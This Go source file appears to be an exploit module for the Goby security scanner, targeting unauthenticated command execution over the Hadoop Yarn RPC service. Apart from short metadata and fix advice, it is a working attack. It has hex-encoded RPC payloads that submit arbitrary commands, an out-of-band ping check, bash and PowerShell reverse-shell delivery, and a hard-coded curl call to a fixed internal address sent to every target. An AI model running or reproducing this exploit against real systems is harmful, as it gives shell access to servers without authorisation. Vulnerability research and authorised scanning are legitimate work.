package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"math/rand"
	"net"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Hadoop Yarn RPC service unauthorized access rce vulnerability",
    "Description": "<p>Yarn is a Hadoop resource manager. It is a general resource management system and scheduling platform that can provide unified resource management and scheduling for upper-level applications.</p><p>The Hadoop Yarn RPC service (open to the outside world by default) has an RCE vulnerability caused by unauthorized access. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Impact": "Hadoop Yarn RPC service unauthorized access rce vulnerability",
    "Recommendation": "<p>1.Apache Hadoop officials suggest that users enable Kerberos authentication. The relevant configurations are as follows:</p>&lt;property&gt;    &lt;name&gt;hadoop.security.authentication&lt;/name&gt;    &lt;value&gt;kerberos&lt;/value&gt;    &lt;final&gt;false&lt;/final&gt;    &lt;source&gt;core-site.xml&lt;/source&gt;&lt;/property&gt;...&lt;property&gt;    &lt;name&gt;hadoop.rpc.protection&lt;/name&gt;    &lt;value&gt;authentication&lt;/value&gt;    &lt;final&gt;false&lt;/final&gt;    &lt;source&gt;core-default.xml&lt;/source&gt;&lt;/property&gt;<p>2.Set the port where the Hadoop RPC service is located to be open only to trusted addresses.</p>",
    "Product": "Apache-Hadoop",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Hadoop Yarn RPC 服务未授权访问命令执行漏洞",
            "Description": "<p><span style=\"font-size: 16px;\">Yarn 是 Hadoop 资源管理器，它是一个通用资源管理系统和调度平台，可为上层应用提供统一的资源管理和调度。</span><br></p><p><span style=\"font-size: 16px;\">Hadoop Yarn RPC 服务（默认对外开放）存在<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">未授权访问导致的 RCE 漏洞</span>。<span style=\"font-size: 16px;\">攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></span></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>",
            "Recommendation": "<p>1、Apache Hadoop官方建议用户开启Kerberos认证，相关配置如下：</p><pre><code><span role=\"presentation\" style=\"padding-right: 0.1px;\">&lt;property&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;name&gt;hadoop.security.authentication&lt;/name&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;value&gt;kerberos&lt;/value&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;final&gt;false&lt;/final&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;source&gt;core-site.xml&lt;/source&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">&lt;/property&gt;...</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">&lt;property&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;name&gt;hadoop.rpc.protection&lt;/name&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;value&gt;authentication&lt;/value&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;final&gt;false&lt;/final&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;source&gt;core-default.xml&lt;/source&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">&lt;/property&gt;</span></code></pre><p>2、设置 Hadoop RPC服务所在端口仅对可信地址开放。</p>",
            "Product": "Apache-Hadoop",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Hadoop Yarn RPC service unauthorized access rce vulnerability",
            "Description": "<p>Yarn is a Hadoop resource manager. It is a general resource management system and scheduling platform that can provide unified resource management and scheduling for upper-level applications.</p><p>The Hadoop Yarn RPC service (open to the outside world by default) has an RCE vulnerability caused by unauthorized access. Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Impact": "Hadoop Yarn RPC service unauthorized access rce vulnerability",
            "Recommendation": "<p>1.Apache Hadoop officials suggest that users enable Kerberos authentication. The relevant configurations are as follows:</p><pre><code><span role=\"presentation\" style=\"padding-right: 0.1px;\">&lt;property&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;name&gt;hadoop.security.authentication&lt;/name&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;value&gt;kerberos&lt;/value&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;final&gt;false&lt;/final&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;source&gt;core-site.xml&lt;/source&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">&lt;/property&gt;...</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">&lt;property&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;name&gt;hadoop.rpc.protection&lt;/name&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;value&gt;authentication&lt;/value&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;final&gt;false&lt;/final&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\"> &nbsp;  &lt;source&gt;core-default.xml&lt;/source&gt;</span><br style=\"box-sizing: content-box;\"><span role=\"presentation\" style=\"padding-right: 0.1px;\">&lt;/property&gt;</span></code></pre><p>2.Set the port where the Hadoop RPC service is located to be open only to trusted addresses.</p>",
            "Product": "Apache-Hadoop",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"/static/yarn.css\" || body=\"yarn.dt.plugins.js\")",
    "GobyQuery": "(body=\"/static/yarn.css\" || body=\"yarn.dt.plugins.js\")",
    "Author": "keeeee",
    "Homepage": "https://hadoop.apache.org",
    "DisclosureDate": "2021-11-16",
    "References": [
        "https://nosec.org/home/detail/4905.html",
        "https://help.aliyun.com/noticelist/articleid/1060952286.html",
        "https://mp.weixin.qq.com/s/0F06a7GppFz3KV3XNb-Xrg"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux,goby_shell_windows",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10237"
}`

	sendData := func(conn net.Conn, payloadHex string) string {
		payload, err := hex.DecodeString(payloadHex)
		if err != nil {
			fmt.Println("hex error:" + payloadHex)
			return ""
		}
		_, err = conn.Write(payload)
		if err != nil {
			return ""
		}
		resp := make([]byte, 4096)
		_, err = conn.Read(resp)
		if err != nil {
			return ""
		}
		return string(resp)
	}
	genpayload_1 := func() string {
		name1 := strings.ToUpper(hex.EncodeToString([]byte(goutils.RandomHexString(9))))
		payload := ""
		id := "7A8E391E547A4C0AB31C0D88C5FD9FEA"
		payload += "68727063090000000000611A0802100018052210"
		payload += id
		payload += "280145120B0A09" + name1 + "1A366F72672E6170616368652E6861646F6F702E7961726E2E6170692E4170706C69636174696F6E436C69656E7450726F746F636F6C50420000006A1A0802100018002210"
		payload += id
		payload += "28004D0A116765744E65774170706C69636174696F6E12366F72672E6170616368652E6861646F6F702E7961726E2E6170692E4170706C69636174696F6E436C69656E7450726F746F636F6C5042180100"
		return payload
	}
	genpayload_2 := func(cmd string, index string) string {
		lenCmd := len(cmd)
		lenCmdHex := ""
		i := lenCmd / 128
		len1 := 173 + len(cmd)
		len2 := 67 + len(cmd)
		len3 := 65 + len(cmd)
		len4 := 2 + len(cmd)
		if i == 0 {
			lenCmdHex = fmt.Sprintf("%02x", lenCmd)
		} else if i == 1 {
			lenCmdHex = fmt.Sprintf("%02x", lenCmd) + "01"
			len4 += 1
			len3 += 1
			len2 += 1
			len1 += 1
		} else {
			return ""
		}
		lenHex4 := fmt.Sprintf("%02x", len4)
		if len4 > 127 {
			lenHex4 += "01"
			len3 += 1
			len2 += 1
			len1 += 1
		}
		lenHex3 := fmt.Sprintf("%02x", len3)
		if len3 > 127 {
			lenHex3 = lenHex3 + "01"
			len1 += 1
			len2 += 1
		}
		lenHex2 := fmt.Sprintf("%02x", len2)
		if len2 > 127 {
			lenHex2 = lenHex2 + "01"
			len1 += 1
		}
		lenHex1 := fmt.Sprintf("%08x", len1)
		payload := ""
		payload += lenHex1
		id := "7A8E391E547A4C0AB31C0D88C5FD9FEA"
		payload += "1A0802100018022210"
		payload += id
		payload += "28004D0A117375626D69744170706C69636174696F6E12366F72672E6170616368652E6861646F6F702E7961726E2E6170692E4170706C69636174696F6E436C69656E7450726F746F636F6C50421801"
		payload += lenHex2
		payload += "0A"
		payload += lenHex3
		payload += "0A"
		payload += "0908"
		payload += index
		name2 := strings.ToUpper(hex.EncodeToString([]byte(goutils.RandomHexString(5))))
		payload += "10DAEEC99DD22F1205" + name2 + "2A"
		payload += lenHex4
		payload += "2A"
		payload += lenCmdHex
		payload += hex.EncodeToString([]byte(cmd))
		payload += "4A29080010001A130A096D656D6F72792D6D6210001A024D6920001A0E0A0676636F72657310001A002000"
		return payload
	}
	genpayload_3 := func(index string) string {
		payload := ""
		id := "7A8E391E547A4C0AB31C0D88C5FD9FEA"
		payload += "000000781A0802100018042210"
		payload += id
		payload += "2800500A146765744170706C69636174696F6E5265706F727412366F72672E6170616368652E6861646F6F702E7961726E2E6170692E4170706C69636174696F6E436C69656E7450726F746F636F6C504218010B0A0908"
		payload += index
		payload += "10DAEEC99DD22F"
		return payload
	}
	sendPayload := func(u *httpclient.FixUrl, cmd string) bool {
		conn, err := httpclient.GetTCPConn(u.HostInfo)
		if err != nil {
			return false
		}
		index := strconv.Itoa(rand.Intn(6) + 1)
		index += strings.ToUpper(goutils.RandomHexString(1))
		defer conn.Close()
		hello := genpayload_1()
		sendData(conn, hello)
		payload2 := genpayload_2(cmd, index)
		sendData(conn, payload2)
		payload3 := genpayload_3(index)
		sendData(conn, payload3)
		cmd2 := "curl http://192.168.1.1:9993/123"
		sendData(conn, genpayload_1())
		sendData(conn, genpayload_2(cmd2, index))
		sendData(conn, genpayload_3(index))
		return true
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomHex := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(randomHex)
			checkUrl = "ping " + checkUrl
			sendPayload(u, checkUrl)
			if godclient.PullExists(randomHex, time.Second*20) {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					fmt.Println(cmd)
					sendPayload(expResult.HostInfo, "/bin/"+cmd)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 20):
					}
				}
			} else if ss.Params["AttackType"].(string) == "goby_shell_windows" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_java", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
					return expResult
				} else {
					cmd := godclient.ReverseTCPByPowershell(rp)
					sendPayload(expResult.HostInfo, cmd)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 20):
					}
				}
			}
			return expResult
		},
	))
}
